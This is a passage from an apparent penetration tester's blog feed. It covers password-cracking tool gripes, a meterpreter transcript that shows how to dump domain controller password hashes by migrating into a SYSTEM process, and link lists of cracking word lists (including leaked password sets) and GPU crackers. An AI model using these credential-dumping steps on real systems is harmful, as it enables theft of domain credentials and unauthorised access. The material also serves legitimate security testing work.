&lt;li&gt;Lack of LM support. I get that this is a complicated hashing algorithm, but the fact that 90% of companies still have it turned on and cracking any more than a few with Rainbow Tables is impractical unless you have a SSD raid with a GPU based cracker ($$$$$).&lt;/li&gt;
&lt;li&gt;Lack of dictionary support. Right now the best way to crack passwords is with oclhashcat-plus since it is GPU based and supports rules, multiple hashes (hash files) and directories of hashes. However, it has a very limited list of hashes it supports (No LM, SHA1, etc..) and it doesn&amp;rsquo;t support dump formats, so you need to strip the file so it just has the hash (this is more of just a bother than a gripe).

&lt;ul&gt;
&lt;li&gt;I say &amp;lsquo;The best way&amp;rsquo; because anything that has a key space larger than upper-alpha-numeric-32symbol (LM) is just a bit nuts to try and brute force out of the gate unless your goal is to &amp;lsquo;crack them all&amp;rsquo;. Me as a pentester, I want to get as many as possible, as quick as possible, so this means dictionaries are the smarter option. (Maybe later I can do the straight brute if I really need / want to)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Lack of POT. For some reason every cracking app on the planet, save for JtR, thinks it&amp;rsquo;s a good idea to crack the same hash multiple times. I wish even Cain would keep a secret store of all the hashes it&amp;rsquo;s cracked stripped of anything unimportant (need the salt (username) sometimes) and store it in the background so that if it comes across the same hash it can say &amp;ldquo;oo oo I know this one&amp;rdquo; and auto populate it even before I start cracking. Why more cracking software writers don&amp;rsquo;t do this I&amp;rsquo;ll never know (would make their software seem a ton faster the more it is used)&lt;/li&gt;
&lt;li&gt;Lack of formatting documentation (#ripshairout). Rare is the time I&amp;rsquo;ve found a cracking program that shows you how it wants to consume a hash. JtR is the most egregious offenders of this but they all do it. One would think people would try and make it easy for people to use their software (give examples of what shit is supposed to look like at least if you don&amp;rsquo;t support standard formats)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Those are my biggest gripes that the moment. If I am wrong on any account, let me know, I would love to know of a better way to do things.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Dumping Hashes on Win2k8 R2 x64 with Metasploit</title>
      <link>http://room362.com/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</link>
      <pubDate>Mon, 16 May 2011 02:35:31 +0000</pubDate>
      
      <guid>http://room362.com/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</guid>
      <description>&lt;p&gt;When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &amp;ldquo;The parameter is incorrect&amp;rdquo; error in meterpreter. So I&amp;rsquo;ve had to fall back on dropping binaries which I really don&amp;rsquo;t like doing because of the added clean up and chance of getting &amp;lsquo;caught&amp;rsquo;. Well, with a bit of migration you&amp;rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;                ##                          ###           ##    ##
 ##  ##  #### ###### ####  #####   #####    ##    ####        ######
####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
                                      ##


       =[ metasploit v3.7.1-release [core:3.7 api:1.0]
+ -- --=[ 687 exploits - 364 auxiliary - 43 post
+ -- --=[ 217 payloads - 27 encoders - 8 nops
       =[ svn r12622 updated today (2011.05.15)

msf &amp;gt; 
[*] DC_IP:49220 Request received for /AYSBk...
[*] DC_IP:49220 Staging connection for target YSBk received...
[*] Patching Target ID YSBk into DLL
[*] DC_IP:49221 Request received for /BYSBk...
[*] DC_IP:49221 Stage connection for target YSBk received...
[*] Meterpreter session 7 opened (ATTACKER_IP:443 -&amp;gt; DC_IP:49221) at Sun May 15 21:37:31 +0000 2011

msf &amp;gt; sessions -i 7
[*] Starting interaction with 7...

meterpreter &amp;gt; sysinfo
System Language : en_US
OS              : Windows 2008 R2 (Build 7601, Service Pack 1).
Computer        : DOMAINCONTROLLE
Architecture    : x64 (Current Process is WOW64)
Meterpreter     : x86/win32

meterpreter &amp;gt; ps

Process list
============

 PID   Name                                       Arch  Session  User                          Path
 ---   ----                                       ----  -------  ----                          ----
 0     [System Process]                                                                        
 4     System                                     x64   0                                      
 224   smss.exe                                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 324   csrss.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 364   csrss.exe                                  x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 372   wininit.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 404   winlogon.exe                               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 468   services.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 476   lsass.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 484   lsm.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 628   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 708   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 804   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 836   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 880   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 932   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 972   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 328   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1172  spoolsv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1204  Microsoft.ActiveDirectory.WebServices.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe
 1252  dfsrs.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfsrs.exe
 1288  dns.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dns.exe
 1316  ismserv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\ismserv.exe
 1360  svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1392  vmtoolsd.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1464  wlms.exe                                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wlmswlms.exe
 1492  dfssvc.exe                                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfssvc.exe
 1572  VMUpgradeHelper.exe                        x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMUpgradeHelper.exe
 1896  TPAutoConnSvc.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
 2016  vds.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 872   sppsvc.exe                                 x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 1268  WmiPrvSE.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbemWmiPrvSE.exe
 2360  taskhost.exe                               x64   1        SITTINGDUCK\juser             C:\Windows\System32\taskhost.exe
 2424  dwm.exe                                    x64   1        SITTINGDUCK\juser             C:\Windows\System32\dwm.exe
 2452  explorer.exe                               x64   1        SITTINGDUCK\juser             C:\Windows\explorer.exe
 2504  TPAutoConnect.exe                          x64   1        SITTINGDUCK\juser             C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 2512  conhost.exe                                x64   1        SITTINGDUCK\juser             C:\Windows\System32\conhost.exe
 2632  VMwareTray.exe                             x64   1        SITTINGDUCK\juser             C:\Program Files\VMware\VMware Tools\VMwareTray.exe
 2640  VMwareUser.exe                             x64   1        SITTINGDUCK\juser             C:\Program Files\VMware\VMware Tools\VMwareUser.exe
 2716  mmc.exe                                    x64   1        SITTINGDUCK\juser             C:\Windows\System32\mmc.exe
 3052  mscorsvw.exe                               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Frameworkv4.0.30319\mscorsvw.exe
 2216  TrustedInstaller.exe                       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 1932  mscorsvw.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft\.NET\Framework\64\v4.0.30319\mscorsvw.exe
 2564  svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1732  msdtc.exe                                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 2992  notepad.exe                                x86   1        SITTINGDUCK\juser             C:\Windows\SysWOW64\notepad.exe
 1720  notepad.exe                                x64   1        SITTINGDUCK\juser             C:\Windows\System32\notepad.exe


meterpreter &amp;gt; getpid
Current pid: 2992

meterpreter &amp;gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ah, the wonderful &amp;lsquo;The parameter is incorrect&amp;rsquo; error. Ok we are an admin since we can see the user for SYSTEM processes, so that isn&amp;rsquo;t the issue, but lets do a &amp;lsquo;getprivs&amp;rsquo; just in case:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getprivs    
============================================================
Enabled Process Privileges
============================================================
  SeDebugPrivilege
  SeIncreaseQuotaPrivilege
  SeMachineAccountPrivilege
  SeSecurityPrivilege
  SeTakeOwnershipPrivilege
  SeLoadDriverPrivilege
  SeSystemProfilePrivilege
  SeSystemtimePrivilege
  SeProfileSingleProcessPrivilege
  SeIncreaseBasePriorityPrivilege
  SeCreatePagefilePrivilege
  SeBackupPrivilege
  SeRestorePrivilege
  SeShutdownPrivilege
  SeSystemEnvironmentPrivilege
  SeChangeNotifyPrivilege
  SeRemoteShutdownPrivilege
  SeUndockPrivilege
  SeEnableDelegationPrivilege
  SeManageVolumePrivilege

meterpreter &amp;gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Boo.. Ok, so maybe we have to be &amp;lsquo;SYSTEM&amp;rsquo;&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getsystem
...got system (via technique 1).

meterpreter &amp;gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Still nothing&amp;hellip; Maybe it requires that we be in a 64 bit process&amp;hellip; PID 1720 was 64 bit version of Notepad, lets try that&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1720
[*] Migrating to 1720...
[*] Migration completed successfully.

meterpreter &amp;gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Damn, what about as &amp;lsquo;SYSTEM&amp;rsquo;&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getsystem ...got system (via technique 1).  
meterpreter &amp;gt; hashdump 
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No joy.. hmmm What about a &amp;lsquo;SYSTEM&amp;rsquo; process that was already there.. &amp;lsquo;dns.exe&amp;rsquo; PID 1288 should be good&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1288
[*] Migrating to 1288...
[*] Migration completed successfully.

meterpreter &amp;gt; hashdump
Administrator:500:MYLMHASH:MYNTLMHASH:::
Guest:501:MYLMHASH:MYNTLMHASH:::
krbtgtG:502:MYLMHASH:MYNTLMHASH:::
Domain Admin?:1000:MYLMHASH:MYNTLMHASH:::
juserN:1104:MYLMHASH:MYNTLMHASH:::
jane.user??:1105:MYLMHASH:MYNTLMHASH:::
DOMAINCONTROLLE$?:1001:MYLMHASH:MYNTLMHASH:::

meterpreter &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;w00t. So I don&amp;rsquo;t know why, but it seems that you have to be in a &amp;lsquo;SYSTEM&amp;rsquo; process who&amp;rsquo;s primary token (started by SYSTEM) is SYSTEM (since &amp;lsquo;getsystem&amp;rsquo; wasn&amp;rsquo;t working). I also tried this getting SYSTEM to run a 32 bit process, and was still unable to dump hashes. So next time you&amp;rsquo;re on an Win2k8 R2 64 bit box, remember to migrate into a pre-existing 64bit SYSTEM process and you should be good to go.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-05-15 23:39 by Rob Fuller&lt;/p&gt;

&lt;p&gt;As Gavin points out in the comments, it is better to run the meterpreter script or post module to do hashdumping on systems. The only time this is not the case is when you are trying to get domain hashes on a domain controller. The registry does not store these hashes (as far as I know). So LSASS injection is the only route and you have to jump through the mentioned hoops.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Password / Word lists</title>
      <link>http://room362.com/post/2009/2009-09-18-password-word-lists/</link>
      <pubDate>Fri, 18 Sep 2009 14:41:16 +0000</pubDate>
      
      <guid>http://room362.com/post/2009/2009-09-18-password-word-lists/</guid>
      <description>

&lt;p&gt;Brute force, even though it&amp;rsquo;s gotten so fast, is still a long way away from cracking long complex passwords. That&amp;rsquo;s were word lists come in handy. It&amp;rsquo;s usually the crackers first go-to solution, slam a word list against the hash, if that doesn&amp;rsquo;t work, try rainbow tables (if they happen to have the tables for that specific hash type), and then the full on brute force. Some would say those first two steps are reversed, and it really is the choice of the the person doing it and the word lists they have to work with.&lt;/p&gt;

&lt;p&gt;Matt Weir and company created a cool tool that has the best of both worlds, Dictionary based Rainbow Tables with Dr-Crack, which you can find here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://reusablesec.googlepages.com/drcrack&#34;&gt;http://reusablesec.googlepages.com/drcrack&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;But, back to the reason of this post, word lists. Where do you get them? Here are a couple of my favorite places in no particular order:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.packetstormsecurity.org/Crackers/wordlists/&#34;&gt;http://www.packetstormsecurity.org/Crackers/wordlists/&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;http://www.theargon.com/achilles/wordlists/&#34;&gt;http://www.theargon.com/achilles/wordlists/&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;http://www.openwall.com/wordlists/&#34;&gt;http://www.openwall.com/wordlists/&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;http://www.outpost9.com/files/WordLists.html&#34;&gt;http://www.outpost9.com/files/WordLists.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I like to keep 3 size word lists:&lt;br /&gt;
1. small and fast: usually based on the output of one of the tools i&amp;rsquo;m about to tell you about&lt;br /&gt;
2. medium: this is my custom list that I add passwords I find / crack and generally think are good to add. I&amp;rsquo;m pretty picky about what goes into this list&lt;br /&gt;
3. huge: any wordlist I come across gets added to this list, it gets sorted and uniqued and restored&lt;/p&gt;

&lt;p&gt;Now the two tools that I like for the small list is are CeWL and wyd&lt;/p&gt;

&lt;p&gt;CeWL - &lt;a href=&#34;http://www.digininja.org/projects/cewl.php&#34;&gt;http://www.digininja.org/projects/cewl.php&lt;/a&gt;&lt;br /&gt;
Wyd - &lt;a href=&#34;http://www.remote-exploit.org/codes_wyd.html&#34;&gt;http://www.remote-exploit.org/codes_wyd.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;They have some very similar lists of features, your mileage may vary. But they basically parse files and web pages for words and generate password lists based on the words found.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-02-11 08:01 by Rob Fuller&lt;/p&gt;

&lt;p&gt;Korelogic&amp;rsquo;s password lists: &lt;a href=&#34;http://contest.korelogic.com/wordlists.html&#34;&gt;http://contest.korelogic.com/wordlists.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Korelogic&amp;rsquo;s John rule set: &lt;a href=&#34;http://contest.korelogic.com/rules.html&#34;&gt;http://contest.korelogic.com/rules.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2010-03-30 05:00 by Rob Fuller&lt;/p&gt;

&lt;p&gt;I missed one hell of a treasure trove of word lists:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://trac.kismac-ng.org/wiki/wordlists&#34;&gt;http://trac.kismac-ng.org/wiki/wordlists&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Right now, there list is this:&lt;/p&gt;

&lt;h2 id=&#34;openwall:3ca642d2f9a65b0dc156a6c09dde5be8&#34;&gt;OpenWall:&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://ftp.sunet.se/pub/security/tools/net/Openwall/wordlists/&#34;&gt;http://ftp.sunet.se/pub/security/tools/net/Openwall/wordlists/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;ftp://ftp.openwall.com/pub/wordlists/&#34;&gt;ftp://ftp.openwall.com/pub/wordlists/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.openwall.com/mirrors/&#34;&gt;http://www.openwall.com/mirrors/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://passwordz.info/&#34;&gt;http://passwordz.info/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;ftp://ftp.ox.ac.uk/pub/wordlists/&#34;&gt;ftp://ftp.ox.ac.uk/pub/wordlists/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://gdataonline.com/downloads/GDict/&#34;&gt;http://gdataonline.com/downloads/GDict/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://theargon.com/achilles/wordlists/&#34;&gt;http://theargon.com/achilles/wordlists/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://theargon.com/achilles/wordlists/theargonlists/&#34;&gt;http://theargon.com/achilles/wordlists/theargonlists/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;ftp://ftp.cerias.purdue.edu/pub/dict/&#34;&gt;ftp://ftp.cerias.purdue.edu/pub/dict/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.outpost9.com/files/WordLists.html&#34;&gt;http://www.outpost9.com/files/WordLists.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.securinfos.info/wordlists_dictionnaires.php&#34;&gt;http://www.securinfos.info/wordlists_dictionnaires.php&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.vulnerabilityassessment.co.uk/passwords.htm&#34;&gt;http://www.vulnerabilityassessment.co.uk/passwords.htm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://packetstormsecurity.org/Crackers/wordlists/&#34;&gt;http://packetstormsecurity.org/Crackers/wordlists/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.ai.uga.edu/ftplib/natural-language/moby/&#34;&gt;http://www.ai.uga.edu/ftplib/natural-language/moby/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.insidepro.com/eng/download.shtml&#34;&gt;http://www.insidepro.com/eng/download.shtml&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.word-list.com/&#34;&gt;http://www.word-list.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.cotse.com/tools/wordlists1.htm&#34;&gt;http://www.cotse.com/tools/wordlists1.htm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.cotse.com/tools/wordlists2.htm&#34;&gt;http://www.cotse.com/tools/wordlists2.htm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.phreak.org/index/archive01/hacking/wordlsts/wordlsts.shtml&#34;&gt;http://www.phreak.org/index/archive01/hacking/wordlsts/wordlsts.shtml&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.indianz.ch/tools/doc/wordlists.zip&#34;&gt;http://www.indianz.ch/tools/doc/wordlists.zip&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://wordlist.sourceforge.net/&#34;&gt;http://wordlist.sourceforge.net/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://prdownloads.sourceforge.net/wepattack/wordlist.tar.gz?download&#34;&gt;http://prdownloads.sourceforge.net/wepattack/wordlist.tar.gz?download&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://hacor.org/docs/hugelist.txt&#34;&gt;http://hacor.org/docs/hugelist.txt&lt;/a&gt; (broken link. Does anyone have it hosted elsewhere?)

&lt;ul&gt;
&lt;li&gt;shhh! - &lt;a href=&#34;http://room362.com/projects/hugelist.txt&#34;&gt;/projects/hugelist.txt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;by-operat0r:3ca642d2f9a65b0dc156a6c09dde5be8&#34;&gt;By operat0r&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://rapidshare.com/files/165513464/word.lst.s.u.john.s.u.200.part01.rar&#34;&gt;http://rapidshare.com/files/165513464/word.lst.s.u.john.s.u.200.part01.rar&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://rapidshare.com/files/165518143/word.lst.s.u.john.s.u.200.part02.rar&#34;&gt;http://rapidshare.com/files/165518143/word.lst.s.u.john.s.u.200.part02.rar&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://rapidshare.com/files/165498510/word.lst.s.u.john.s.u.200.part03.rar&#34;&gt;http://rapidshare.com/files/165498510/word.lst.s.u.john.s.u.200.part03.rar&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://wiki.services.openoffice.org/wiki/Dictionaries&#34;&gt;http://wiki.services.openoffice.org/wiki/Dictionaries&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://article7.org/wordlists/&#34;&gt;http://article7.org/wordlists/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2010-03-30 04:22 by Rob Fuller&lt;/p&gt;

&lt;p&gt;Recent additions:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.skullsecurity.org/wiki/index.php/Passwords&#34;&gt;http://www.skullsecurity.org/wiki/index.php/Passwords&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;hotmail: &lt;a href=&#34;http://current.com/technology/91108676_email-password-leak-update-gmail-yahoo-aol-and-hotmail-hit-too.htm&#34;&gt;http://current.com/technology/91108676_email-password-leak-update-gmail-yahoo-aol-and-hotmail-hit-too.htm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;rockyou: &lt;a href=&#34;http://securitystream.info/data-breaches/easy-passwords-found-in-rockyou-data-leak/&#34;&gt;http://securitystream.info/data-breaches/easy-passwords-found-in-rockyou-data-leak/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://wordlist.sourceforge.net/&#34;&gt;http://wordlist.sourceforge.net/&lt;/a&gt; (Kevin&amp;rsquo;s Word Lists)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.phenoelit-us.org/dpl/dpl.html&#34;&gt;http://www.phenoelit-us.org/dpl/dpl.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.offensive-security.com/wpa-tables/wpalist.txt.tar.bz2&#34;&gt;http://www.offensive-security.com/wpa-tables/wpalist.txt.tar.bz2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.renderlab.net/projects/WPA-tables/&#34;&gt;http://www.renderlab.net/projects/WPA-tables/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>GPU Hash / Password Cracking</title>
      <link>http://room362.com/post/2009/2009-09-18-gpu-hash-password-cracking/</link>
      <pubDate>Fri, 18 Sep 2009 01:44:39 +0000</pubDate>
      
      <guid>http://room362.com/post/2009/2009-09-18-gpu-hash-password-cracking/</guid>
      <description>&lt;p&gt;I recently upgraded my video card and had a rough time finding programs that fit the hype of GPU password cracking, so here is what I found so that you won&amp;rsquo;t have as hard a time.&lt;/p&gt;

&lt;p&gt;Ivan Golubev&amp;rsquo;s SHA1/MD5/MD4 cracker: &lt;a href=&#34;http://www.golubev.com/hashgpu.htm&#34;&gt;&lt;br /&gt;
http://www.golubev.com/hashgpu.htm&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ivan Golubev&amp;rsquo;s RAR pass cracker:&lt;br /&gt;
&lt;a href=&#34;http://www.golubev.com/rargpu.htm&#34;&gt;http://www.golubev.com/rargpu.htm&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;CUDA Multiforcer (down at the time of this posting)&lt;br /&gt;
&lt;a href=&#34;http://www.cryptohaze.com/bruteforcers.php&#34;&gt;http://www.cryptohaze.com/bruteforcers.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;BarsWF - MD5 Cracker:&lt;br /&gt;
&lt;a href=&#34;http://3.14.by/en/md5&#34;&gt;http://3.14.by/en/md5&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;GPU MD5 Crack: (Included in BackTrack 4 repos &amp;ldquo;gpu-md5-crack&amp;rdquo;)&lt;br /&gt;
&lt;a href=&#34;http://bvernoux.free.fr/md5/index.php&#34;&gt;http://bvernoux.free.fr/md5/index.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Distributed Hash Cracker:&lt;br /&gt;
&lt;a href=&#34;http://rpisec.net/projects/show/hash-cracker&#34;&gt;http://rpisec.net/projects/show/hash-cracker&lt;/a&gt;&lt;br /&gt;
&amp;rdquo; This is an interesting one as it has a PHP front end and is agent based, so you can use one or a dozen computers, and it will use the CPUs and GPUs available&amp;rdquo;&lt;/p&gt;

&lt;p&gt;Pentoo Live CD with a bunch of GPU cracking goodness built in:&lt;br /&gt;
&lt;a href=&#34;http://pentoo.blogspot.com/&#34;&gt;http://pentoo.blogspot.com/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Extreme GPU Bruteforcer (39.95 Euro)&lt;br /&gt;
&lt;a href=&#34;http://www.insidepro.com/eng/egb.shtml&#34;&gt;http://www.insidepro.com/eng/egb.shtml&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ElcomSoft Distributed Password Recovery ($599 for 1st lvl - 20 hosts)&lt;br /&gt;
&lt;a href=&#34;http://www.elcomsoft.com/edpr.html&#34;&gt;http://www.elcomsoft.com/edpr.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ax0n from &lt;a href=&#34;http://www.h-i-r.net/&#34;&gt;http://www.h-i-r.net/&lt;/a&gt; shot me an email stating that BT4 has some more GPU tools added to it:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Just FYI, BT4 also added some CUDA GPU cracking functionality a while&lt;br /&gt;
back ago. IIRC It includes Pyrit and CUDA-Multiforcer &amp;ndash; maybe a few&lt;br /&gt;
others. Pyrit is a cuda-enabled WPA-PSK cracker that you may also be&lt;br /&gt;
interested in.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Pyrit - WPA/PSK - WPA2/PSK GPU cracker&lt;br /&gt;
&lt;a href=&#34;http://code.google.com/p/pyrit/&#34;&gt;http://code.google.com/p/pyrit/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>